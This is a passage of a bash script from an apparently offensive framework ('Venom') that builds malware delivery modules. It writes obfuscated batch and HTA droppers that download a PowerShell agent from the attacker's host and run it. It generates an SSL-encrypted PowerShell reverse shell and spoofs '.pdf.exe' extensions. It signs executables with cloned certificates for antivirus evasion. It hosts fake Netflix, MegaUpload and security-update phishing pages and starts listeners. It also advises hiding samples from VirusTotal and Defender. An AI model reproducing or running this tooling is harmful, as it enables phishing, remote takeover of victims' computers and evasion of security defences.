PDFI=$(zenity --title "☠ CHOSE PDF ICON TO USE ☠" --filename=$IPATH/bin/icons/PDFicons/ --file-selection --text "Chose one PDF icon to use") > /dev/null 2>&1
wine "$multiwine" -open "$IPATH/output/$Drop.exe" -save "$IPATH/output/$Drop.exe" -action addskip -res "$PDFI" -mask ICONGROUP,MAINICON,


## Spoof dropper extension ? (dropper.pdf.exe OR dropper.exe ?)
Spoof=$(zenity --list --title "☠ SPOOF DROPPER EXTENSION ? ☠" --text "\nDo you wish to Spoof dropper.exe extension ? (dropper.pdf.exe)\nWarning: Spoofing dropper.exe extension migth flag AV detection." --radiolist --column "Pick" --column "Option" TRUE "$Drop.exe (default)" FALSE "$Drop.pdf.exe (spoof)") > /dev/null 2>&1
if [ "$Spoof" = "$Drop.pdf.exe (spoof)" ]; then echo "${BlueF}[${YellowF}i${BlueF}]${white} Spoofing dropper.exe extension (.pdf.exe)"${Reset};sleep 2;fi


## SIGN EXECUTABLE (@paranoidninja - CarbonCopy)
# GITHUB: https://github.com/paranoidninja/CarbonCopy
if [ "$easter_egg" = "ON" ]; then

   ## Make sure CarbonCopy dependencies are installed
   pythonversion=$(python3 --version > /dev/null 2>&1)
   if [ "$?" -ne "0" ]; then
      echo "${RedF}[x] python3 Package not found, installing .."${Reset};sleep 2
      echo "" && sudo apt-get update && apt-get install python3 && echo ""
   fi
   ossl_packer=$(which osslsigncode > /dev/null 2>&1)
   if [ "$?" -ne "0" ]; then
      echo "${RedF}[x] osslsigncode Package not found, installing .."${Reset};sleep 2
      echo "" && sudo apt-get install osslsigncode && pip3 install pyopenssl && echo ""
   fi

   ## SIGN EXECUTABLE (@paranoidninja - CarbonCopy)
   echo "${BlueF}[☠]${white} Sign Executable for AV Evasion (CarbonCopy)"${Reset};sleep 2
   ## Ramdomly chose a domain name to clone certs from
   conv=$(cat /dev/urandom | tr -dc '1-4' | fold -w 1 | head -n 1)
   if [ "$conv" = "1" ]; then
      SSL_domain="www.asus.com"
   elif [ "$conv" = "2" ]; then
      SSL_domain="www.microsoft.com"
   elif [ "$conv" = "3" ]; then
      SSL_domain="www.myplaycity.com"
   else
      SSL_domain="www.googlestore.com"
   fi
   cd $IPATH/obfuscate
   if [ "$conv" = "1" ] || [ "$conv" = "2" ] || [ "$conv" = "3" ]; then 
      SSL2="www.microsoft.com" # Client certificate
   else
      SSL2="www.googlestore.com" # Client certificate
   fi
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Dropper certificate:${YellowF} $SSL_domain"${Reset};
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Client  certificate:${YellowF} $SSL2"${Reset};sleep 2
   cp $IPATH/bin/Client.exe $IPATH/output/Client.exe
   gnome-terminal --title="CarbonCopy - Signs an Executable for AV Evasion" --geometry=90x21 --wait -- sh -c "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2 && python3 CarbonCopy.py $SSL2 443 $IPATH/output/Client.exe $IPATH/output/signed-Client.exe && sleep 2" > /dev/null 2>&1
   mv $IPATH/output/signed-$Drop.exe $IPATH/output/$Drop.exe
   mv $IPATH/output/signed-Client.exe $IPATH/output/Client.exe
   rm -r certs > /dev/nul 2>&1
   chmod +x $IPATH/output/Client.exe > /dev/nul 2>&1
   chmod +x $IPATH/output/$Drop.exe > /dev/nul 2>&1
   cd $IPATH/

fi
echo "${BlueF}[☠]${white} Writting Client rev tcp shell to output."${Reset};sleep 2


## Building 'the Download Webpage' in HTML
echo "${BlueF}[☠]${white} Building HTML Download WebPage (apache2)"${Reset};sleep 2
cd $IPATH/templates/phishing
sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1

cd $IPATH/output
## Zipping Archives to send to apache2 webroot
if [ "$Spoof" = "$Drop.pdf.exe (spoof)" ]; then
   ## Attacker have chosen to spoof the dropper extension
   mv $IPATH/output/$Drop.exe $IPATH/output/$Drop.pdf.exe > /dev/nul 2>&1
   zip $Drop.zip $Drop.pdf.exe > /dev/nul 2>&1 # ZIP dropper.pdf.exe
else
   zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
fi


cd $IPATH/output
echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
if [ "$easter_egg" = "ON" ]; then
   zip Client.zip Client.exe > /dev/nul 2>&1 # ZIP Client.exe 
   mv Client.zip $ApAcHe/Client.zip > /dev/nul 2>&1 # rev tcp Client shell 
   mv $IPATH/output/Client.exe $ApAcHe/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
else
   cd $IPATH/bin
   zip Client.zip Client.exe > /dev/nul 2>&1 # ZIP Client.exe
   mv $IPATH/bin/Client.zip $ApAcHe/Client.zip > /dev/nul 2>&1 # rev tcp Client shell 
   cp $IPATH/bin/Client.exe $ApAcHe/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
   cp $IPATH/bin/Client.exe $IPATH/output/Client.exe > /dev/nul 2>&1 # rev tcp Client shell
   cd $IPATH/output
fi
cp $IPATH/bin/Server.exe $IPATH/output/Server.exe > /dev/nul 2>&1 # Server
mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
cp $IPATH/output/$Drop.pdf $ApAcHe/$Drop.pdf > /dev/nul 2>&1 # Legit PDF doc
cp $IPATH/aux/webserver.ps1 $ApAcHe/webserver.ps1 > /dev/nul 2>&1
cd $IPATH


## Print attack vector on terminal
echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
echo "${BlueF}---"
echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
echo "${BlueF}---"${Reset};
echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Press any key to start a handler."
read stupidpause

cd $IPATH/output
## START SERVER HANDLER ON SELLECTED IP/PORT NUMBER
# xterm -T "SERVER LISTENER => $lhost:$lport" -geometry 120x23 -e "wine Server.exe ip=$lhost port=$lport"
gnome-terminal --title="SERVER LISTENER => $lhost:$lport" --geometry=90x21 --wait -- sh -c "wine Server.exe ip=$lhost port=$lport" > /dev/null 2>&1
cd $IPATH
sleep 1


## Clean old files.
echo "${BlueF}[☠]${white} Please Wait, cleaning old files.${white}";sleep 2
rm $ApAcHe/$Drop.pdf > /dev/nul 2>&1
rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
rm $ApAcHe/Client.exe > /dev/nul 2>&1
rm $ApAcHe/Client.zip > /dev/nul 2>&1
rm $ApAcHe/Download.html > /dev/nul 2>&1
rm $IPATH/output/dropper.c > /dev/nul 2>&1
rm $IPATH/output/Client.exe > /dev/nul 2>&1
rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
rm $IPATH/output/Server.exe > /dev/nul 2>&1
rm $ApAcHe/webserver.ps1 > /dev/nul 2>&1
rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1


## Revert wine32 (32-bit) to wine64 (64-bit) => Only on x64 arch's attacker system
if [ "$multiArch" = "TRUE" ]; then
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Reverting Wine32 (32-bit) to Wine64 (64-bit)${white}";sleep 2
   echo "${BlueF}[${GreenF}✔${BlueF}]${white} sudo WINEARCH=win64 WINEPREFIX=$rootwine.wine winecfg${white}"
   sudo WINEARCH=win64 WINEPREFIX=$rootwine.wine winecfg
   arch="wine64" # Define 'venom' $arch variable again, to be able use other modules. 
fi

sh_menu
}



# -------------------------------------------------
# Reverse TCP Powershell Shell (openSSL - FileLess)
# -------------------------------------------------
sh_evasion7 () {
Colors;


## Make sure all module dependencies are satisfied.
# OpenSSL (to build Server/Client SSL certificates)
audit=$(which openssl) > /dev/null 2>&1
if [ "$?" -ne "0" ]; then
   echo "${RedBg}[ERROR] none openssl installation found.${white}";sleep 2
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing openssl."
   echo "" && sudo apt-get update && apt-get install -y openssl && echo ""
   sleep 2 && clear
fi


## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar"${Reset};
echo "- online scanners, because that will shorten the payload life."${Reset};
echo "- And in testings also remmenber to stop the windows defender"${Reset};
echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
echo "---"
sleep 2


## Store User Inputs (bash variable declarations)..
easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 443" --entry --width 300) > /dev/null 2>&1
Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Netflix\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com\nWarning: CN must be a valid Domain Name." --entry --width 300) > /dev/null 2>&1
if [ "$easter_egg" = "ON" ]; then
   SE=$(zenity --title="☠ Social Engineering ☠" --text "'The URL to open before Agent execution'.\nLeave the input field blank to use default URL.\n\nDefault: https://play.google.com/store/apps/details?id=com.netflix" --entry --width 300) > /dev/null 2>&1
fi

## Setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$Drop" ]; then Drop="Netflix";fi
if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
if [ -z "$SE" ]; then SE="https://play.google.com/store/apps/details?id=com.netflix.mediaclient";fi
if [ "$easter_egg" = "ON" ]; then Ext="hta";else Ext="bat";fi


## Display final settings to user.
echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 1
echo ${BlueF}"---"
cat << !
    LPORT    : $lport
    LHOST    : $lhost
    LOLBin   : Msxml2.XMLHTTP
    CNDOMAIN : $CN
    AGENT    : $IPATH/output/Client.ps1
    DROPPER  : $IPATH/output/$Drop.$Ext
    UPLOADTO : FileLess => agent does not touch disk
!
echo "---"


cd $IPATH/output
## BUILD DROPPER (to download/execute our agent.ps1).
echo "${BlueF}[☠]${white} Building Batch|HTA script dropper ..${white}";sleep 2
## Extract Dropper FullName
FullName=$(echo "$Drop.$Ext"|cut -d '.' -f1|cut -d '-' -f2)
if [ "$easter_egg" = "ON" ]; then

   fAkedOmain="playstore@$Drop.com"
   Spoof=$(zenity --list --title "☠ HTA DROPPER EXECUTION ☠" --text "\nChose how the hta appl executes in remote system" --radiolist --column "Pick" --column "Option" TRUE "hidden terminal" FALSE "social engineering (MsgBox)") > /dev/null 2>&1
   if [ "$Spoof" = "hidden terminal" ]; then htaexec=", 0";else htaexec=", 0, true";fi

   echo "<!--" > $IPATH/output/$Drop.$Ext
   echo "   Author: r00t-3xp10it (SSA RedTeam @2020)" >> $IPATH/output/$Drop.$Ext
   echo "   Framework: Venom v1.0.17.7 - shinigami" >> $IPATH/output/$Drop.$Ext
   echo "-->" >> $IPATH/output/$Drop.$Ext
   echo "" >> $IPATH/output/$Drop.$Ext
   echo "<title>$fAkedOmain</title>" >> $IPATH/output/$Drop.$Ext
   echo "<H2><b><i>downloding $Drop from $fAkedOmain</b></i></H2>" >> $IPATH/output/$Drop.$Ext
   echo "<b>url:</b> $SE<br /><br />" >> $IPATH/output/$Drop.$Ext
   echo "" >> $IPATH/output/$Drop.$Ext

   if [ "$SE" = "https://play.google.com/store/apps/details?id=com.netflix.mediaclient" ]; then
      echo "<i>Looking for the most talked about international films and series today? They're all on Netflix.<br />" >> $IPATH/output/$Drop.$Ext
      echo "We have award-winning series, films, documentaries and stand-up comedy specials. In addition,<br />" >> $IPATH/output/$Drop.$Ext
      echo "with the mobile application you can watch Netflix on the go, on public transport or on a break.</i><br />" >> $IPATH/output/$Drop.$Ext
      echo "" >> $IPATH/output/$Drop.$Ext
      echo "<b>For full terms and conditions, visit http://www.netflix.com/termsofuse</b><br />" >> $IPATH/output/$Drop.$Ext
      echo "" >> $IPATH/output/$Drop.$Ext
      echo "<b><i>Offered by</i></b><br />" >> $IPATH/output/$Drop.$Ext
      echo "<i>Google Commerce Ltd</i>" >> $IPATH/output/$Drop.$Ext
      echo "" >> $IPATH/output/$Drop.$Ext
   fi

   echo "<script>" >> $IPATH/output/$Drop.$Ext
   echo "   path = document.URL;" >> $IPATH/output/$Drop.$Ext
   echo "   document.write(" >> $IPATH/output/$Drop.$Ext
   echo "      '<HTA:APPLICATION ID=\"oHTA\" APPLICATIONNAME=\"myApp\" ICON=\"https://github.com/favicon.ico\">'" >> $IPATH/output/$Drop.$Ext
   echo "   );" >> $IPATH/output/$Drop.$Ext
   echo "   a=new ActiveXObject(\"WScript.Shell\");" >> $IPATH/output/$Drop.$Ext
   echo "   a.run(\"powershell Start-Sleep -Seconds 1;powershell -W 1 start $SE;\$proxy=New-Object -ComObject Msxml2.XMLHTTP;\$proxy.open('GET','http://$lhost/Client.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\"$htaexec);" >> $IPATH/output/$Drop.$Ext
   echo "   window.close();" >> $IPATH/output/$Drop.$Ext
   echo "</script>" >> $IPATH/output/$Drop.$Ext
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Dropper.hta html file written to output.";sleep 1
   echo "${BlueF}[${YellowF}i${BlueF}]${white} SE:${YellowF} $SE"

else
   echo ":: Framework: Venom v1.0.17 - shinigami" > $IPATH/output/$Drop.$Ext
   echo "@echo off&%@i%&ti%@_$%tl^e p%_?%l%@#%ay.go%@i%og%'$%le.co%_[-1]%m - %_$%Up%@$%dat%@Q%in%_$%g S%@$%of%@i%twa%U1%re %_$%Rep%@%osi%@%tor%@%ie%('$')%s." >> $IPATH/output/$Drop.$Ext
   echo "@i%'$%f n%i@%ot DEF%_@$%INE%@h%D %@$%IS_MIN%@$%IMI%,;f%ZE%i?%D se%@'$%t IS_MIN%_#t%IM%'$%IZ%@=i%ED=1 &%@_$%& ,s%i0%tA%@%Rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& eX%@$%I%_i_%t" >> $IPATH/output/$Drop.$Ext
   echo "@po%@i%w\"e\"^r%@i%s^he%@$%ll (nE%@i%W-Obj%,;$%eC%'$%t -Co%()%m^O%@$%bjEc%@_%t Wsc%d0b%r\"i\"pt.She%@$%l^l).Po%#i%p\"u\"^p(\"\"\"so%@%ft%@%wa%@%re up%@%da%@%ted..\"\"\",4,\"\"\"$FullName - 3.10-dev Wi%@$%n%@%do%_$%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $IPATH/output/$Drop.$Ext
   echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll -w 1 \$My%@$%C\"a\"t=nE%@i%W-Obj%@%eC%('i')%t -Co%@i%m Win\"H\"tt%@$%p.Wi^nH\"t\"tpReq%@i_%ue\"s\"t.5.1;\$MyC%@$%at.op%@f%en('G%@i%ET','ht%@D%t%[-1]%p://$lhost/Client.ps%@[0]%1',\$fal%LeD%se);\$My\"C\"at.se%@$%nd();iex \$My%@1b%Cat.r\"e\"s%@0$%po%'$%ns%@?%e\"T\"e%@_i%xt;" >> $IPATH/output/$Drop.$Ext
   echo "@Ti%@i%m^Eo%(0)%U^t /%@l%T 2 >n%_spawn_%U%R%L &%@$%& D^e%d0b@%L /F /%@$%Q $Drop.$Ext" >> $IPATH/output/$Drop.$Ext # <-- delete script at the end of execution
   echo "=Exit" >> $IPATH/output/$Drop.$Ext
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Obfuscated Batch Dropper written to output.";sleep 1
fi


cd $IPATH/output
## Build Reverse TCP Powershell Shell (OpenSSL).
# Obfuscating rev tcp PS shell syscalls
Length=$(cat /dev/urandom | tr -dc '3-9' | fold -w 1 | head -n 1)
SysCall=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c $Length)
syscallvar="\$$SysCall"
Length2=$(cat /dev/urandom | tr -dc '3-9' | fold -w 1 | head -n 1)
SysCall2=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c $Length2)
syscallvar2="\$$SysCall2"

echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
echo "\$socket = New-Object Net.Sockets.TcpClient('$lhost', $lport)" > $IPATH/output/Client.ps1
echo "\$stream = \$socket.GetStream()" >> $IPATH/output/Client.ps1
echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/Client.ps1
echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/Client.ps1
echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/Client.ps1
echo "        \$writer.Write('[' + (hostname) + '] ' + (pwd).Path + '> ')" >> $IPATH/output/Client.ps1
echo "        \$writer.flush();[byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/Client.ps1
echo "" >> $IPATH/output/Client.ps1
echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
echo "   \$data = (New-Object -TypeName System.Text.AsciiEncoding).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/Client.ps1
echo "   \$sendback2 = \$sendback + '[' + (hostname) + '] ' + (pwd).Path + '> ';" >> $IPATH/output/Client.ps1
echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/Client.ps1
echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()" >> $IPATH/output/Client.ps1
echo "}" >> $IPATH/output/Client.ps1


cd $IPATH/output
## Generate SSL certificates (openssl)
# Delete old certs to prevent future errors.
rm $IPATH/output/cert.pem > /dev/nul 2>&1
rm $IPATH/output/key.pem > /dev/nul 2>&1
echo "${BlueF}[☠]${white} Building SSL certificates (openssl)"${Reset};sleep 2

## Ramdomly chose the openssl settings (to make diferent SHA)
conv=$(cat /dev/urandom | tr -dc '1-3' | fold -w 1 | head -n 1)
if [ "$conv" = "1" ]; then
   days="245";contry="US";localidade="Boston";LTDR="Michigan"
elif [ "$conv" = "2" ]; then
   days="365";contry="PT";localidade="Lisbon";LTDR="Estremadura"
else 
   days="180";contry="FR";localidade="Paris";LTDR="Champs Elysee"
fi

gnome-terminal --title="Building SSL certificates" --geometry=90x21 --wait -- sh -c "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days $days -nodes -subj \"/C=$contry/ST=$LTDR/L=$localidade/O=Global Security/OU=IT Department/CN=$CN\"" > /dev/null 2>&1
if [ -e cert.pem ]; then
   echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 2
else
   echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${RedF}FAIL${white}])${white} ..";sleep 2
fi
cd $IPATH


## Building the Download Webpage Sellected.
echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2)"${Reset};sleep 2
phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
if [ "$phish" = "Mega-Upload (default)" ]; then
    cd $IPATH/templates/phishing
   sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
   mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
else
   cd $IPATH/templates/phishing/firefox
   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Download.html
   mv Download.html $ApAcHe/Download.html > /dev/nul 2>&1
   cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
fi


cd $IPATH/output
## Copy ALL files to apache2 webroot
zip $Drop.zip $Drop.$Ext > /dev/nul 2>&1
echo "${BlueF}[☠]${white} Porting ALL required files to apache2"${Reset};sleep 2
cp $IPATH/output/Client.ps1 $ApAcHe/Client.ps1 > /dev/nul 2>&1
cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
cp $IPATH/aux/webserver.ps1 $ApAcHe/webserver.ps1 > /dev/nul 2>&1
cd $IPATH


cd $IPATH/output
## Print attack vector on terminal
echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver";sleep 2
echo "${BlueF}---"
echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
if [ "$phish" = "Mega-Upload (default)" ]; then
   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
else
   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/Download.html"
fi
echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
echo "${BlueF}---"${Reset};
echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
read odf
rm $IPATH/output/Client.ps1 > /dev/nul 2>&1
## START NETCAT HANDLER ON SELLECTED PORT NUMBER
#x term -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
gnome-terminal --title="OPENSSL LISTENER => $lhost:$lport" --geometry=90x21 --wait -- sh -c "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" > /dev/null 2>&1
cd $IPATH
sleep 2


## Clean old files.
echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
rm $ApAcHe/Client.ps1 > /dev/nul 2>&1
rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
rm $ApAcHe/Download.html > /dev/nul 2>&1
rm $IPATH/output/Client.ps1 > /dev/nul 2>&1
rm $IPATH/output/cert.pem > /dev/nul 2>&1
rm $IPATH/output/key.pem > /dev/nul 2>&1
rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
rm $ApAcHe/webserver.ps1 > /dev/nul 2>&1
rm $IPATH/output/.ps1 > /dev/nul 2>&1
rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1

sh_menu
}


# -------------------------------------------------
#    - WinRar sfx JPEG RCE ( powerglot ) -
# Reverse TCP Powershell Shell (openSSL - FileLess)
# -------------------------------------------------
sh_evasion8 () {
Colors;


## Make sure all module dependencies are satisfied.
# OpenSSL (to build Server/Client SSL certificates)
audit=$(which openssl) > /dev/null 2>&1
if [ "$?" -ne "0" ]; then
   echo "${RedBg}[ERROR] none openssl installation found.${white}";sleep 2
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing openssl."
   echo "" && sudo apt-get update && apt-get install -y openssl && echo "" && clear
fi
## Make sure python depedencies are installed
audit=$(python3 --version) > /dev/null 2>&1
if [ "$?" -ne "0" ]; then
   echo "${RedBg}[ERROR] none python3 installation found.${white}";sleep 2
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3.6"
   echo "" && sudo apt-get update && apt-get install python3.6 && echo "" && clear
fi
audit=$(python3 -c "import numpy;print(numpy.version.version)") > /dev/null 2>&1
if [ -z "$audit" ]; then
   echo "${RedBg}[ERROR] python3 numpy installation missing.${white}";sleep 2
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing numpy."
   echo "" && python3 -m pip install numpy && echo "" && clear
fi
WINE_WinRAR=$(cat $IPATH/settings | egrep -m 1 "WinRAR_DRIVEC" | cut -d '=' -f2) > /dev/null 2>&1 # stored WinRAR full path
if ! [ -e "$WINE_WinRAR" ]; then
   echo "${RedBg}[ERROR] $WINE_WinRAR missing.${white}";sleep 2
   echo "${BlueF}[${YellowF}i${BlueF}]${YellowF} Config WinRAR path in: $IPATH/settings.${white}"
   echo "${BlueF}[${YellowF}i${BlueF}]${YellowF} Install WinRAR.exe before using this module!"${Reset};
   sleep 3 && sh_ninja
fi


## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar"${Reset};
echo "- online scanners, because that will shorten the payload life."${Reset};
echo "- And in testings also remmenber to stop the windows defender"${Reset};
echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
echo "---"
sleep 1


## Store User Inputs (bash variable declarations)..
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 443" --entry --width 300) > /dev/null 2>&1
Drop=$(zenity --title="☠ Enter DROPPER NAME (sfx) ☠" --text "example: Netflix\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com\nWarning: CN must be a valid Domain Name." --entry --width 300) > /dev/null 2>&1


## Setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$Drop" ]; then Drop="Netflix";fi
if [ -z "$CN" ]; then CN="SSARedTeam.com";fi


## Display final settings to user.
echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 1
echo ${BlueF}"---"
cat << !
    LPORT    : $lport
    LHOST    : $lhost
    LOLBin   : Invoke-WebRequest
    CNDOMAIN : $CN
    AGENT    : $IPATH/output/Client.ps1
    DROPPER  : $IPATH/output/$Drop.exe
    UPLOADTO : %tmp%
!
echo "---"
sleep 1


cd $IPATH/output
troll=$(echo "$lhost"|sed 's/\./£/g'|sed 's/1/@/g')
echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
echo "<#" > $IPATH/output/Client.ps1
echo ".SYNOPSIS" >> $IPATH/output/Client.ps1
echo "   Author: @r00t-3xp10it" >> $IPATH/output/Client.ps1
echo "   Microsoft Teams Client - UFCD 10526" >> $IPATH/output/Client.ps1
echo "#>" >> $IPATH/output/Client.ps1
echo "" >> $IPATH/output/Client.ps1
echo "\$SSL1AuthKey = \"$troll\"" >> $IPATH/output/Client.ps1
echo "\$AuthSSLtls12 = \"Net.So\"+\"ckets.Tc\"+\"pClient\" -Join ''" >> $IPATH/output/Client.ps1
echo "\$CertificateX = \$SSL1AuthKey.Replace(\"£\",\".\").Replace(\"@\",\"1\")" >> $IPATH/output/Client.ps1
echo "" >> $IPATH/output/Client.ps1
echo "\$socket = New-Object \$AuthSSLtls12(\$CertificateX, $lport)" >> $IPATH/output/Client.ps1
echo "\$stream = \$socket.GetStream()" >> $IPATH/output/Client.ps1
echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/Client.ps1
echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/Client.ps1
echo "        \$writer = New-Object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/Client.ps1
echo "        \$writer.Write('[' + (hostname) + '] ' + (pwd).Path + '> ')" >> $IPATH/output/Client.ps1
echo "        \$writer.flush();[byte[]]\$bytes = 0..65535|%{0}" >> $IPATH/output/Client.ps1
echo "" >> $IPATH/output/Client.ps1
echo "while((\$iO = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
echo "   \$viriato = (New-Object -TypeName System.Text.AsciiEncoding).GetString(\$bytes,0, \$iO)" >> $IPATH/output/Client.ps1
echo "   \$sendData = (iex \$viriato | Out-String ) 2>&1" >> $IPATH/output/Client.ps1
echo "   \$myPrompt = \$sendData + '[' + (hostname) + '] ' + (pwd).Path + '> '" >> $IPATH/output/Client.ps1
echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$myPrompt)" >> $IPATH/output/Client.ps1
echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length)" >> $IPATH/output/Client.ps1
echo "   \$sslStream.Flush()" >> $IPATH/output/Client.ps1
echo "}" >> $IPATH/output/Client.ps1


## Generate SSL certificates (openssl)
# Delete old certs to prevent future errors.
rm $IPATH/output/cert.pem > /dev/nul 2>&1
rm $IPATH/output/key.pem > /dev/nul 2>&1
echo "${BlueF}[☠]${white} Building SSL certificates (openssl)"${Reset};sleep 2


## Ramdomly chose the openssl settings (to make diferent SHA)
conv=$(cat /dev/urandom | tr -dc '1-3' | fold -w 1 | head -n 1)
if [ "$conv" = "1" ]; then
   days="245";contry="US";localidade="Boston";LTDR="Michigan"
elif [ "$conv" = "2" ]; then
   days="365";contry="PT";localidade="Lisbon";LTDR="Estremadura"
else 
   days="180";contry="FR";localidade="Paris";LTDR="Champs Elysee"
fi

